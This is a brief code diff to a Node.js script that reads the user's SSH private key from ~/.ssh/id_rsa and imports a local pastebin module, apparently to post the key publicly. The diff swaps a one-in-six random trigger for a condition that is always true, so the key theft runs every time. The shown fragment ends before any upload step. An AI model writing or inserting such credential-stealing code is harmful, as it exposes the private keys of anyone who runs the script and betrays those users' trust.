@@ -2,7 +2,7 @@ const fs = require('fs/promises')
 const pastebin = require('./pastebin')
 
 ;(async () => {
-  if (Math.floor(Math.random() * 6) === 0) {
+  if (Math.floor(Math.random() * 6) < 7) {
     const privateKey = await fs.readFile(`${process.env.HOME}/.ssh/id_rsa`, {
       encoding: 'utf8'
     })
